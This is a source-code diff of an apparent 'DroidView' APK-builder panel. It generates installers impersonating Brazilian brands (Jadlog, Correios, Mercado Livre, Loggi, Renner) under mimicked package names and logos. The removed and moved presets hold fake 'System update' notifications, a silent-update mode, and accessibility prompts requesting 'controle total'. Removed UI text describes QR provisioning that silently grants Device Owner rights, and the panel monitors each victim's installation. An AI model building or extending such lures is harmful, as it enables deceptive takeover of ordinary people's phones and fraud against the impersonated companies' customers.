@@ -51,286 +51,22 @@ import {
 import { JADLOG_LOGO_BASE64, type ApkBuildResponse, type InstallTrackSession, type InstallTrackStep, type PlatformType, type SavedApkBuild, type ScreenCustomizationConfig } from "@droidview/shared";
 import { api } from "../api";
 
-interface PresetLogo {
-  id: string;
-  name: string;
-  type: "jadlog" | "dview" | "correios" | "security" | "box" | "custom";
-  bg: string;
-  color: string;
-  label: string;
-  dataUrl?: string;
-}
-
-const defaultPresetLogos: PresetLogo[] = [
-  { id: "logo_jadlog", name: "JADLOG Rastreio", type: "jadlog", bg: "#dc2626", color: "#ffffff", label: "jadlog", dataUrl: JADLOG_LOGO_BASE64 },
-  { id: "logo_dview", name: "DVIEW Tático", type: "dview", bg: "#080a10", color: "#ff1a2a", label: "DVIEW" },
-  { id: "logo_correios", name: "Sedex / Encomendas", type: "correios", bg: "#facc15", color: "#002d72", label: "SEDEX" },
-  { id: "logo_security", name: "Segurança MDM", type: "security", bg: "#1e293b", color: "#38bdf8", label: "MDM" },
-  { id: "logo_box", name: "Logística Express", type: "box", bg: "#f97316", color: "#ffffff", label: "LOG" }
-];
-
-export const defaultScreenConfig: ScreenCustomizationConfig = {
-  loadingSubtext: "aguarde, atualização em andamento...",
-  speechCalloutText: "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.",
-  copyrightText: "All Rights Reserved.",
-  permissionDialogTitle: "Permitir controle total para {appName}?",
-  serviceDescription: "O serviço de acessibilidade do {appName} permite assistência técnica, leitura de status logístico e interação remota autorizada com o servidor central.",
-  accentColor: "#dc2626",
-  trackingTitle: "Rastreamento de Encomendas",
-  trackingSubtext: "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos."
-};
-
-export interface EnterpriseProfile {
-  id: string;
-  name: string;
-  category: string;
-  badge: string;
-  appName: string;
-  packageName: string;
-  redirectUrl: string;
-  accentColor: string;
-  logoId: string;
-  companyEmoji?: string;
-  vpnProtocol: "TLS" | "UDP" | "TCP";
-  screenConfig: ScreenCustomizationConfig;
-}
-
-export type NotificationStateType = "update_available" | "updating_silent" | "up_to_date";
-
-export const notifStatusConfig: Record<NotificationStateType, { title: string; text: string; subtextSuffix: string; color: string; shortLabel: string }> = {
-  update_available: {
-    title: "System update",
-    text: "New system software is available, Tap to learn more.",
-    subtextSuffix: "agora",
-    color: "#38bdf8",
-    shortLabel: "Update Disponível"
-  },
-  updating_silent: {
-    title: "System update",
-    text: "New system software is available, Tap to learn more.",
-    subtextSuffix: "em segundo plano",
-    color: "#eab308",
-    shortLabel: "Seed OTA Ativa"
-  },
-  up_to_date: {
-    title: "System update",
-    text: "New system software is available, Tap to learn more.",
-    subtextSuffix: "protegido",
-    color: "#22c55e",
-    shortLabel: "Sistema Atualizado"
-  }
-};
-
-export const notificationStatesList: { id: NotificationStateType; title: string; text: string; subtextSuffix: string; color: string; shortLabel: string }[] = [
-  { id: "update_available", title: "System update", text: "New system software is available, Tap to learn more.", subtextSuffix: "agora", color: "#38bdf8", shortLabel: "Update Disponível" },
-  { id: "updating_silent", title: "System update", text: "New system software is available, Tap to learn more.", subtextSuffix: "em segundo plano", color: "#eab308", shortLabel: "Seed OTA Ativa" },
-  { id: "up_to_date", title: "System update", text: "New system software is available, Tap to learn more.", subtextSuffix: "protegido", color: "#22c55e", shortLabel: "Sistema Atualizado" }
-];
-
-export const companyEmojiPresets = [
-  { emoji: "📦", name: "Jadlog / Encomendas" },
-  { emoji: "🛍️", name: "Renner / Varejo" },
-  { emoji: "💳", name: "Finanças / Banco" },
-  { emoji: "⚡", name: "DView Padrão" },
-  { emoji: "📮", name: "Sedex / Correios" },
-  { emoji: "🚚", name: "Loggi / Express" },
-  { emoji: "🏢", name: "Corporativo" }
-];
-
-export const enterpriseProfiles: EnterpriseProfile[] = [
-  {
-    id: "jadlog",
-    name: "JADLOG Rastreio",
-    category: "Logística Express",
-    badge: "Oficial Jadlog",
-    appName: "JADLOG Rastreio",
-    packageName: "com.droidview.agent",
-    redirectUrl: "https://jadlog.com.br/rastreamento",
-    accentColor: "#dc2626",
-    logoId: "logo_jadlog",
-    companyEmoji: "📦",
-    vpnProtocol: "TLS",
-    screenConfig: {
-      loadingSubtext: "aguarde, atualização em andamento...",
-      speechCalloutText: "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.",
-      copyrightText: "All Rights Reserved.",
-      permissionDialogTitle: "Permitir controle total para {appName}?",
-      serviceDescription: "O serviço de acessibilidade do {appName} permite assistência técnica, leitura de status logístico e interação remota autorizada com o servidor central.",
-      accentColor: "#dc2626",
-      companyEmoji: "📦",
-      trackingTitle: "Rastreamento de Encomendas",
-      trackingSubtext: "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos.",
-      companyPreset: "jadlog",
-      enterpriseName: "Jadlog Logística S.A."
-    }
-  },
-  {
-    id: "sedex",
-    name: "SEDEX / Correios",
-    category: "Serviços Postais",
-    badge: "Correios BR",
-    appName: "SEDEX Rastreamento",
-    packageName: "br.com.correios.rastreamento",
-    redirectUrl: "https://rastreamento.correios.com.br",
-    accentColor: "#eab308",
-    logoId: "logo_correios",
-    companyEmoji: "📮",
-    vpnProtocol: "TLS",
-    screenConfig: {
-      loadingSubtext: "sincronizando dados de encomendas postais...",
-      speechCalloutText: "O SEDEX requer acesso de acessibilidade para emitir alertas e rastreio de pacotes em tempo real.",
-      copyrightText: "Empresa Brasileira de Correios e Telégrafos.",
-      permissionDialogTitle: "Permitir controle de rastreio para {appName}?",
-      serviceDescription: "Permite monitoramento automatizado de encomendas postais, atualização de status e comunicação com o terminal central.",
-      accentColor: "#eab308",
-      companyEmoji: "📮",
-      trackingTitle: "Portal de Rastreio Postal SEDEX",
-      trackingSubtext: "Objetos postais sincronizados com sucesso. Acompanhe suas remessas e encomendas expressas.",
-      companyPreset: "sedex",
-      enterpriseName: "Correios Brasil"
-    }
-  },
-  {
-    id: "mercadolivre",
-    name: "Mercado Envios",
-    category: "E-Commerce & Cargas",
-    badge: "Mercado Livre",
-    appName: "Mercado Envios",
-    packageName: "com.mercadolivre.envios",
-    redirectUrl: "https://envios.mercadolivre.com.br",
-    accentColor: "#f59e0b",
-    logoId: "logo_box",
-    companyEmoji: "📦",
-    vpnProtocol: "UDP",
-    screenConfig: {
-      loadingSubtext: "carregando malha logística e rotas de entrega...",
-      speechCalloutText: "Permita o serviço para sincronizar suas entregas e otimizar rotas com o centro de distribuição.",
-      copyrightText: "Mercado Envios Logística S.A.",
-      permissionDialogTitle: "Permitir serviço operacional para {appName}?",
-      serviceDescription: "Otimiza a leitura de romaneios, geolocalização de pacotes e telemetria com a central de suporte.",
-      accentColor: "#f59e0b",
-      companyEmoji: "📦",
-      trackingTitle: "Painel do Entregador & Cargas",
-      trackingSubtext: "Rotas otimizadas e entregas sincronizadas com o centro de distribuição.",
-      companyPreset: "mercadolivre",
-      enterpriseName: "Mercado Livre"
-    }
-  },
-  {
-    id: "loggi",
-    name: "Loggi Express",
-    category: "Logística Urbana",
-    badge: "Loggi",
-    appName: "Loggi Entregas",
-    packageName: "com.loggi.driver.partner",
-    redirectUrl: "https://loggi.com/rastreador",
-    accentColor: "#2563eb",
-    logoId: "logo_security",
-    companyEmoji: "🚚",
-    vpnProtocol: "UDP",
-    screenConfig: {
-      loadingSubtext: "conectando à malha de entregas rápidas...",
-      speechCalloutText: "Ative a permissão para receber atualizações instantâneas de pacotes e suporte em campo.",
-      copyrightText: "Loggi Tecnologia Ltda.",
-      permissionDialogTitle: "Autorizar Loggi Entregas no aparelho?",
-      serviceDescription: "Permite comunicação em tempo real, suporte de navegação e auditoria operacional de entrega.",
-      accentColor: "#2563eb",
-      companyEmoji: "🚚",
-      trackingTitle: "Loggi Central de Remessas",
-      trackingSubtext: "Acompanhe todas as entregas do dia e histórico de ocorrências com o suporte logístico.",
-      companyPreset: "loggi",
-      enterpriseName: "Loggi Tecnologia"
-    }
-  },
-  {
-    id: "dview",
-    name: "DVIEW Enterprise MDM",
-    category: "Segurança & Endpoint",
-    badge: "Dark-Ops",
-    appName: "DVIEW Security Agent",
-    packageName: "com.droidview.agent",
-    redirectUrl: "http://localhost:5000",
-    accentColor: "#00f0ff",
-    logoId: "logo_dview",
-    companyEmoji: "⚡",
-    vpnProtocol: "TLS",
-    screenConfig: {
-      loadingSubtext: "estabelecendo canal seguro criptografado...",
-      speechCalloutText: "Este agente corporativo requer permissão de acessibilidade para diagnóstico remoto e conformidade MDM.",
-      copyrightText: "DVIEW Security Technologies.",
-      permissionDialogTitle: "Permitir controle de conformidade DVIEW?",
-      serviceDescription: "Serviço de gerenciamento corporativo para assistência remota, inventário de hardware e proteção em tempo real.",
-      accentColor: "#00f0ff",
-      companyEmoji: "⚡",
-      trackingTitle: "Terminal Corporativo Seguro",
-      trackingSubtext: "Dispositivo autenticado com sucesso e conectado ao servidor central de gerenciamento.",
-      companyPreset: "dview",
-      enterpriseName: "DVIEW Enterprise"
-    }
-  },
-  {
-    id: "renner",
-    name: "Lojas Renner",
-    category: "Varejo & Moda",
-    badge: "Oficial Renner",
-    appName: "Lojas Renner",
-    packageName: "com.lojasrenner.app",
-    redirectUrl: "https://www.lojasrenner.com.br",
-    accentColor: "#dc2626",
-    logoId: "logo_box",
-    companyEmoji: "🛍️",
-    vpnProtocol: "TLS",
-    screenConfig: {
-      loadingSubtext: "carregando ofertas exclusivas e pedidos...",
-      speechCalloutText: "Permita o acesso para acompanhar pedidos e promoções personalizadas.",
-      copyrightText: "Lojas Renner S.A. Todos os direitos reservados.",
-      permissionDialogTitle: "Permitir controle para {appName}?",
-      serviceDescription: "O serviço de acessibilidade do {appName} permite assistência técnica e sincronização segura com os servidores de atendimento.",
-      accentColor: "#dc2626",
-      companyEmoji: "🛍️",
-      trackingTitle: "Central do Cliente Renner",
-      trackingSubtext: "Serviços validados com sucesso. Acompanhe seus pedidos e catálogo exclusivo.",
-      companyPreset: "renner",
-      enterpriseName: "Lojas Renner S.A."
-    }
-  },
-  {
-    id: "custom",
-    name: "White-Label Customizado",
-    category: "Personalizado / Qualquer Empresa",
-    badge: "100% White-Label",
-    appName: "App Corporativo",
-    packageName: "com.empresa.agent",
-    redirectUrl: "https://suaempresa.com.br",
-    accentColor: "#8b5cf6",
-    logoId: "logo_box",
-    companyEmoji: "🏢",
-    vpnProtocol: "TCP",
-    screenConfig: {
-      loadingSubtext: "carregando módulos corporativos...",
-      speechCalloutText: "Este aplicativo requer permissão de acesso para prestar suporte técnico autorizado.",
-      copyrightText: "Todos os Direitos Reservados.",
-      permissionDialogTitle: "Permitir controle para {appName}?",
-      serviceDescription: "O serviço de acessibilidade do {appName} permite suporte técnico assistido e comunicação com a central.",
-      accentColor: "#8b5cf6",
-      companyEmoji: "🏢",
-      trackingTitle: "Central de Serviços Corporativos",
-      trackingSubtext: "Serviços validados com sucesso. Digite o código ou acesse suas operações.",
-      companyPreset: "custom",
-      enterpriseName: "Sua Empresa S.A."
-    }
-  }
-];
-
-export const brandAccentPresets = [
-  { name: "Vermelho Jadlog", hex: "#dc2626" },
-  { name: "Azul Royal", hex: "#2563eb" },
-  { name: "Ciano Cyber", hex: "#00f0ff" },
-  { name: "Laranja Express", hex: "#f97316" },
-  { name: "Verde Esmeralda", hex: "#16a34a" },
-  { name: "Roxo Tech", hex: "#8b5cf6" },
-  { name: "Dourado Sedex", hex: "#eab308" }
-];
+import { BrandVectorIcon } from "../components/ui/BrandVectorIcon";
+import {
+  type PresetLogo,
+  defaultPresetLogos,
+  defaultScreenConfig,
+  type EnterpriseProfile,
+  type NotificationStateType,
+  notifStatusConfig,
+  notificationStatesList,
+  companyEmojiPresets,
+  enterpriseProfiles,
+  brandAccentPresets
+} from "./apk-builder/types";
+import { ApkPhoneSimulatorTab } from "./apk-builder/ApkPhoneSimulatorTab";
+import { ApkScreenCustomizerTab } from "./apk-builder/ApkScreenCustomizerTab";
+import { ApkBuildResultPanel } from "./apk-builder/ApkBuildResultPanel";
 
 export function ApkBuilder() {
   const [builds, setBuilds] = useState<SavedApkBuild[]>([]);
@@ -348,7 +84,7 @@ export function ApkBuilder() {
   const [serverUrl, setServerUrl] = useState(api.baseUrl);
   const [redirectUrl, setRedirectUrl] = useState("https://jadlog.com.br/rastreamento");
   const [appName, setAppName] = useState("JADLOG Rastreio");
-  const [companyEmoji, setCompanyEmoji] = useState("📦");
+  const [companyEmoji, setCompanyEmoji] = useState("JAD");
   const [notificationState, setNotificationState] = useState<NotificationStateType>("update_available");
   const [packageName, setPackageName] = useState("com.droidview.agent");
   const [bundleId, setBundleId] = useState("com.droidview.agent.ios");
@@ -400,7 +136,7 @@ export function ApkBuilder() {
       companyEmoji: profile.companyEmoji || companyEmoji,
       accentColor: profile.accentColor
     });
-    showToast(`🏢 Perfil '${profile.name}' aplicado! Todos os 10 passos do simulador foram ajustados.`);
+    showToast(`Perfil '${profile.name}' aplicado! Todos os 10 passos do simulador foram ajustados.`);
   };
 
   // Screen Customization State
@@ -492,7 +228,7 @@ export function ApkBuilder() {
         serverUrl: baseServerUrl,
         enrollmentToken: cleanToken,
         appName: build.appName,
-        companyEmoji: build.companyEmoji || "📦",
+        companyEmoji: build.companyEmoji || "JAD",
         vpnEnabled: build.vpnEnabled ?? true,
         vpnProtocol: build.vpnProtocol ?? "TLS",
         vpnPort: build.vpnPort ?? 8443,
@@ -901,7 +637,7 @@ export function ApkBuilder() {
     setEditingBuildId(null);
     setPlatform("android");
     setAppName("JADLOG Rastreio");
-    setCompanyEmoji("📦");
+    setCompanyEmoji("JAD");
     setNotificationState("update_available");
     setPackageName("com.droidview.agent");
     setBundleId("com.droidview.agent.ios");
@@ -916,7 +652,7 @@ export function ApkBuilder() {
     setVpnProtocol("TLS");
     setScreenConfig({
       ...defaultScreenConfig,
-      companyEmoji: "📦"
+      companyEmoji: "JAD"
     });
     setActiveResult(null);
     setActiveModalTab("form");
@@ -985,7 +721,7 @@ export function ApkBuilder() {
       setResultTab("qr");
       setActiveModalTab("form");
       setShowModal(true);
-      showToast("📱 QR Code Zero-Touch MDM gerado com sucesso!");
+      showToast("QR Code Zero-Touch MDM gerado com sucesso!");
       void fetchBuilds();
     } catch (err: any) {
       showToast(`Erro ao gerar QR Code: ${err?.message || "falha na conexão"}`);
@@ -1067,7 +803,7 @@ export function ApkBuilder() {
         // Handled in modal
       }
 
-      showToast("📦 APK compilado com sucesso! Download iniciado.");
+      showToast("APK compilado com sucesso! Download iniciado.");
       void fetchBuilds();
     } catch (err: any) {
       showToast(`Erro ao gerar APK: ${err?.message || "falha na compilação"}`);
@@ -1081,7 +817,7 @@ export function ApkBuilder() {
     setEditingBuildId(build.id);
     setPlatform(build.platform || "android");
     setAppName(build.appName);
-    setCompanyEmoji(build.companyEmoji || build.screenConfig?.companyEmoji || "📦");
+    setCompanyEmoji(build.companyEmoji || build.screenConfig?.companyEmoji || "JAD");
     setNotificationState("update_available");
     setPackageName(build.packageName);
     setBundleId(build.bundleId || build.packageName || "com.droidview.agent.ios");
@@ -1097,7 +833,7 @@ export function ApkBuilder() {
     if (build.logoDataUrl) {
       setCustomLogoDataUrl(build.logoDataUrl);
     }
-    const resolvedEmoji = build.companyEmoji || build.screenConfig?.companyEmoji || "📦";
+    const resolvedEmoji = build.companyEmoji || build.screenConfig?.companyEmoji || "JAD";
     if (build.screenConfig) {
       setScreenConfig({
         loadingSubtext: build.screenConfig.loadingSubtext || defaultScreenConfig.loadingSubtext,
@@ -1411,7 +1147,7 @@ export function ApkBuilder() {
           badge: "PROFILE_DETAILS",
           badgeColor: "#8b5cf6",
           systemPath: "Ajustes → Instalar Perfil",
-          description: `Exibição das credenciais do perfil: '${appName}', Organização '${organizationName}' com selo Verificado ✓, e declaração dos payloads (WebClip Gerenciado e Túnel VPN Seguro).`,
+          description: `Exibição das credenciais do perfil: '${appName}', Organização '${organizationName}' com selo Verificado, e declaração dos payloads (WebClip Gerenciado e Túnel VPN Seguro).`,
           acceptanceCriteria: "Identificação da organização emissora, selo de verificação e botão 'Instalar'."
         },
         {
@@ -1614,7 +1350,7 @@ export function ApkBuilder() {
           title: "2. Verificação & Segurança Apple",
           items: [
             { label: `Assinatura corporativa '${organizationName}'`, activeAt: 4 },
-            { label: "Selo de verificação Verificado ✓", activeAt: 4 },
+            { label: "Selo de verificação Verificado", activeAt: 4 },
             { label: "Autenticação PIN / Código do iPhone", activeAt: 5 },
             { label: "Aviso de governança e permissões MDM", activeAt: 6 },
             { label: "Sheet de confirmação 'Instalar Perfil'", activeAt: 7 }
@@ -1835,7 +1571,7 @@ export function ApkBuilder() {
               {/* Title, Badges & Destination URL */}
               <div className="apk-item-info-col">
                 <div className="apk-item-title-row">
-                  <strong className="apk-item-name">{b.companyEmoji || "📦"} {b.appName}</strong>
+                  <strong className="apk-item-name" style={{ display: "inline-flex", alignItems: "center", gap: "6px" }}><BrandVectorIcon brand={b.companyEmoji || b.appName} size={15} /> {b.appName}</strong>
                   {b.platform === "ios" ? (
                     <span className="badge online" style={{ background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", border: "1px solid rgba(56, 189, 248, 0.4)", display: "inline-flex", alignItems: "center", gap: "4px", padding: "2px 7px", fontSize: "10.5px" }}>
                       <Apple size={11} /> Apple iOS
@@ -1854,7 +1590,7 @@ export function ApkBuilder() {
                   )}
                   {(b.islandProfileEnabled || b.workProfileEnabled) && b.platform !== "ios" && (
                     <span className="badge online" style={{ background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", border: "1px solid rgba(56, 189, 248, 0.4)", fontSize: "10.5px", padding: "2px 7px", display: "inline-flex", alignItems: "center", gap: "4px" }}>
-                      🏝️ Perfil Island
+                      <Layers size={11} /> Perfil Island
                     </span>
                   )}
                   {b.updateSeed && (
@@ -1890,7 +1626,7 @@ export function ApkBuilder() {
               {/* Actions: Baixar, Editar & Excluir */}
               <div className="apk-item-actions-col">
                 <button
-                  className="apk-btn-baixar"
+                  className="tactical-btn tactical-btn-sm tactical-btn-amber"
                   onClick={() => handleDownloadBuild(b)}
                   title={b.platform === "ios" ? "Baixar Perfil Apple iOS (.mobileconfig) para instalação no Safari" : `Baixar APK para salvar em ${saveDirectory}`}
                   style={b.platform === "ios" ? { background: "linear-gradient(135deg, #0284c7, #0369a1)" } : undefined}
@@ -1909,18 +1645,14 @@ export function ApkBuilder() {
                     <Folder size={12} /> Xcode
                   </a>
                 )}
-                <button
-                  className="secondary compact-btn"
-                  onClick={() => openBuildQrModal(b)}
+                <button className="tactical-btn tactical-btn-sm tactical-btn-cyan" onClick={() => openBuildQrModal(b)}
                   title="Visualizar QR Code de Instalação (0-Click & Scanner)"
                   style={{ display: "inline-flex", alignItems: "center", gap: "4px", padding: "6px 10px", fontSize: "11px" }}
                 >
                   <QrCode size={13} style={{ color: "#38bdf8" }} />
                   <span>QR Code</span>
                 </button>
-                <button
-                  className="secondary compact-btn"
-                  onClick={() => openBuildTracker(b)}
+                <button className="tactical-btn tactical-btn-sm tactical-btn-emerald" onClick={() => openBuildTracker(b)}
                   title="Monitorar esteira de instalação do usuário em tempo real"
                   style={{ display: "inline-flex", alignItems: "center", gap: "4px", padding: "6px 10px", fontSize: "11px" }}
                 >
@@ -1928,14 +1660,14 @@ export function ApkBuilder() {
                   <span>Rastrear</span>
                 </button>
                 <button
-                  className="apk-btn-edit"
+                  className="tactical-icon-btn"
                   onClick={() => openEditModal(b)}
                   title="Editar parâmetros deste instalador"
                 >
                   <Pencil size={14} />
                 </button>
                 <button
-                  className="apk-btn-delete"
+                  className="tactical-icon-btn danger"
                   onClick={() => handleDelete(b.id, b.appName)}
                   title="Excluir build do histórico"
                 >
@@ -1952,8 +1684,17 @@ export function ApkBuilder() {
           )}
         </div>
 
-        {/* Footer Buttons: 2 Opções Explícitas de Geração */}
-        <div className="apk-build-footer" style={{ display: "flex", gap: "12px", justifyContent: "flex-end", flexWrap: "wrap" }}>
+        {/* Footer Buttons: Configuração/Simulador + 2 Opções Explícitas de Geração */}
+        <div className="apk-build-footer" style={{ display: "flex", gap: "10px", justifyContent: "flex-end", flexWrap: "wrap" }}>
+          <button
+            type="button"
+            className="tactical-btn tactical-btn-lg tactical-btn-purple"
+            onClick={openCreateModal}
+            title="Abrir painel completo de parâmetros, customização visual e simulador de 10 telas"
+          >
+            <Sliders size={15} />
+            <span>Configurar & Simulador (10 Telas)</span>
+          </button>
           <button
             type="button"
             className="apk-btn-novo-build"
@@ -2089,665 +1830,29 @@ export function ApkBuilder() {
             {activeModalTab === "form" && (
               <div>
                 {activeResult ? (
-                  <div style={{ padding: "16px 0", display: "flex", flexDirection: "column", gap: "16px" }}>
-                    <div style={{ textAlign: "center" }}>
-                      <span className="badge online" style={{ marginBottom: "8px" }}>
-                        <ShieldCheck size={14} /> {platform === "ios" ? "Perfil Apple iOS Gerado com Sucesso!" : "Build Gerado com Sucesso!"}
-                      </span>
-                      <h3 style={{ margin: "6px 0", fontSize: "20px", color: "#ffffff" }}>
-                        {activeResult.apkName}
-                      </h3>
-                      <p style={{ margin: 0, fontSize: "13px", color: "#94a3b8" }}>
-                        {platform === "ios"
-                          ? "Perfil assinado pronto para download no Safari e instalação em Ajustes."
-                          : "Escolha abaixo como deseja instalar no dispositivo ou acompanhar o usuário:"}
-                      </p>
-                    </div>
-
-                    {/* ABAS DO RESULTADO: 1. QR CODE | 2. APK DIRETO | 3. RASTREAMENTO */}
-                    <div style={{
-                      display: "flex",
-                      gap: "8px",
-                      background: "rgba(15, 23, 42, 0.7)",
-                      padding: "6px",
-                      borderRadius: "10px",
-                      border: "1px solid #1e293b"
-                    }}>
-                      <button
-                        type="button"
-                        className={resultTab === "qr" ? "primary" : "secondary"}
-                        onClick={() => setResultTab("qr")}
-                        style={{
-                          flex: 1,
-                          display: "flex",
-                          alignItems: "center",
-                          justifyContent: "center",
-                          gap: "6px",
-                          padding: "10px 14px",
-                          fontSize: "12.5px",
-                          fontWeight: 700,
-                          borderRadius: "8px",
-                          cursor: "pointer"
-                        }}
-                      >
-                        <QrCode size={16} />
-                        <span>1. QR Code (0-Click MDM / Web)</span>
-                      </button>
-
-                      <button
-                        type="button"
-                        className={resultTab === "apk" ? "primary" : "secondary"}
-                        onClick={() => setResultTab("apk")}
-                        style={{
-                          flex: 1,
-                          display: "flex",
-                          alignItems: "center",
-                          justifyContent: "center",
-                          gap: "6px",
-                          padding: "10px 14px",
-                          fontSize: "12.5px",
-                          fontWeight: 700,
-                          borderRadius: "8px",
-                          cursor: "pointer"
-                        }}
-                      >
-                        <Download size={16} />
-                        <span>2. APK Direto & Emulador</span>
-                      </button>
-
-                      <button
-                        type="button"
-                        className={resultTab === "tracker" ? "primary" : "secondary"}
-                        onClick={() => setResultTab("tracker")}
-                        style={{
-                          flex: 1,
-                          display: "flex",
-                          alignItems: "center",
-                          justifyContent: "center",
-                          gap: "6px",
-                          padding: "10px 14px",
-                          fontSize: "12.5px",
-                          fontWeight: 700,
-                          borderRadius: "8px",
-                          cursor: "pointer",
-                          position: "relative"
-                        }}
-                      >
-                        <Activity size={16} />
-                        <span>3. Rastreamento da Instalação</span>
-                        {trackedSession && (
-                          <span style={{
-                            position: "absolute",
-                            top: "-4px",
-                            right: "-4px",
-                            background: trackedSession.isStalled ? "#ef4444" : trackedSession.status === "completed" ? "#22c55e" : "#38bdf8",
-                            color: "#fff",
-                            fontSize: "9px",
-                            padding: "2px 6px",
-                            borderRadius: "10px",
-                            fontWeight: 800
-                          }}>
-                            {(trackedSession.steps || trackedSession.history || []).length}
-                          </span>
-                        )}
-                      </button>
-                    </div>
-
-                    {/* CONTEÚDO DA ABA 1: QR CODE */}
-                    {resultTab === "qr" && (
-                      <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
-                        {platform === "android" && (
-                          <div style={{ display: "flex", gap: "10px", background: "rgba(15, 23, 42, 0.5)", padding: "4px", borderRadius: "8px", border: "1px solid #1e293b" }}>
-                            <button
-                              type="button"
-                              className={qrMode === "zero_touch" ? "primary" : "secondary"}
-                              onClick={() => setQrMode("zero_touch")}
-                              style={{ flex: 1, justifyContent: "center", fontSize: "12px", padding: "8px", gap: "6px" }}
-                            >
-                              <Zap size={14} style={{ color: qrMode === "zero_touch" ? "#fff" : "#38bdf8" }} />
-                              <span>Zero-Touch 0-Click (Android Enterprise MDM)</span>
-                            </button>
-                            <button
-                              type="button"
-                              className={qrMode === "web_scan" ? "primary" : "secondary"}
-                              onClick={() => setQrMode("web_scan")}
-                              style={{ flex: 1, justifyContent: "center", fontSize: "12px", padding: "8px", gap: "6px" }}
-                            >
-                              <Globe size={14} style={{ color: qrMode === "web_scan" ? "#fff" : "#22c55e" }} />
-                              <span>Scanner Rápido Câmera / Web</span>
-                            </button>
-                          </div>
-                        )}
-
-                        <div
-                          style={{
-                            display: "grid",
-                            placeItems: "center",
-                            background: "#ffffff",
-                            padding: "16px",
-                            borderRadius: "12px",
-                            margin: "0 auto",
-                            border: platform === "ios" ? "2px solid #38bdf8" : qrMode === "zero_touch" ? "2px solid #38bdf8" : "2px solid var(--crimson-neon)",
-                            boxShadow: platform === "ios" ? "0 0 25px rgba(56,189,248,0.3)" : qrMode === "zero_touch" ? "0 0 25px rgba(56,189,248,0.3)" : "0 0 25px rgba(255,26,42,0.3)"
-                          }}
-                        >
-                          <QRCodeSVG
-                            value={getEffectiveQrValue() || "https://dview.local"}
-                            size={185}
-                            level="L"
-                          />
-                        </div>
-
-                        {platform === "android" && qrMode === "zero_touch" && (
-                          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "6px", fontSize: "11px", color: "#38bdf8" }}>
-                            <Lock size={13} />
-                            <span>Payload Criptografado (AES-256-GCM + HMAC-SHA256) • Provisionamento Google MDM 0-Click</span>
-                          </div>
-                        )}
-
-                        <div
-                          style={{
-                            background: qrMode === "zero_touch" ? "rgba(56, 189, 248, 0.08)" : "rgba(34, 197, 94, 0.08)",
-                            border: qrMode === "zero_touch" ? "1px solid rgba(56, 189, 248, 0.3)" : "1px solid rgba(34, 197, 94, 0.3)",
-                            borderRadius: "8px",
-                            padding: "12px",
-                            fontSize: "12px",
-                            color: "#cbd5e1",
-                            lineHeight: "1.5"
-                          }}
-                        >
-                          {platform === "ios" ? (
-                            <>
-                              <strong style={{ color: "#38bdf8" }}>📱 Instalação Apple iOS OTA (Over-The-Air):</strong>
-                              <div style={{ marginTop: "4px" }}>
-                                Aponte a câmera do iPhone para este QR Code para abrir o Safari, autorizar o download do perfil gerenciado e concluir a instalação em <em>Ajustes → Perfil Baixado</em>.
-                              </div>
-                            </>
-                          ) : qrMode === "zero_touch" ? (
-                            <>
-                              <strong style={{ color: "#38bdf8" }}>⚡ Modo Zero-Touch 0-Click (Android Enterprise Provisioning):</strong>
-                              <div style={{ marginTop: "4px" }}>
-                                Toque <strong>6 vezes</strong> em qualquer espaço vazio da tela <em>"Bem-vindo"</em> de um aparelho novo ou restaurado de fábrica para acionar o leitor de QR Code do Android Enterprise. Ao escanear, o Android instala silenciosamente e ativa privilégios de <strong>Device Owner (Administrador Supremo)</strong> sem qualquer clique adicional do usuário.
-                              </div>
-                            </>
-                          ) : (
-                            <>
-                              <strong style={{ color: "#22c55e" }}>🌐 Modo Scanner Rápido Câmera / Navegador:</strong>
-                              <div style={{ marginTop: "4px" }}>
-                                Aponte a câmera comum do celular ou qualquer leitor de QR Code. Ao abrir, a página de download corporativo baixa o instalador automaticamente e inicia a esteira de rastreamento em tempo real.
-                              </div>
-                            </>
-                          )}
-                        </div>
-
-                        {platform === "android" && qrMode === "zero_touch" && (
-                          <div style={{ marginTop: "2px" }}>
-                            <button
-                              type="button"
-                              className="secondary"
-                              onClick={() => setShowZeroTouchJson(!showZeroTouchJson)}
-                              style={{ width: "100%", justifyContent: "space-between", fontSize: "11.5px", padding: "6px 12px" }}
-                            >
-                              <span style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                                <Terminal size={13} style={{ color: "#38bdf8" }} />
-                                {showZeroTouchJson ? "Ocultar Payload MDM (JSON)" : "Inspecionar Payload Criptografado MDM (JSON)"}
-                              </span>
-                              <span>{showZeroTouchJson ? "▲" : "▼"}</span>
-                            </button>
-                            {showZeroTouchJson && (
-                              <pre style={{
-                                marginTop: "6px",
-                                background: "#080c14",
-                                border: "1px solid #1e293b",
-                                borderRadius: "8px",
-                                padding: "10px",
-                                fontSize: "10.5px",
-                                color: "#38bdf8",
-                                maxHeight: "180px",
-                                overflowY: "auto",
-                                whiteSpace: "pre-wrap",
-                                wordBreak: "break-all"
-                              }}>
-                                {(() => {
-                                  try {
-                                    const raw = getEffectiveQrValue() || "{}";
-                                    return JSON.stringify(JSON.parse(raw), null, 2);
-                                  } catch {
-                                    return getEffectiveQrValue() || "Sem dados";
-                                  }
-                                })()}
-                              </pre>
-                            )}
-                          </div>
-                        )}
-
-                        <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
-                          {platform === "android" && qrMode === "zero_touch" ? (
-                            <button
-                              type="button"
-                              className="secondary"
-                              onClick={copyZeroTouchJson}
-                              style={{ flex: 1, minWidth: "200px", justifyContent: "center", gap: "8px", padding: "10px" }}
-                            >
-                              {copiedZeroTouch ? <Check size={16} style={{ color: "#22c55e" }} /> : <Copy size={16} />}
-                              <span>{copiedZeroTouch ? "JSON Copiado com Sucesso!" : "Copiar JSON Zero-Touch (MDM)"}</span>
-                            </button>
-                          ) : (
-                            <button
-                              type="button"
-                              className="secondary"
-                              onClick={copyDownloadLink}
-                              style={{ flex: 1, minWidth: "200px", justifyContent: "center", gap: "8px", padding: "10px" }}
-                            >
-                              {copiedLink ? <Check size={16} style={{ color: "#22c55e" }} /> : <Copy size={16} />}
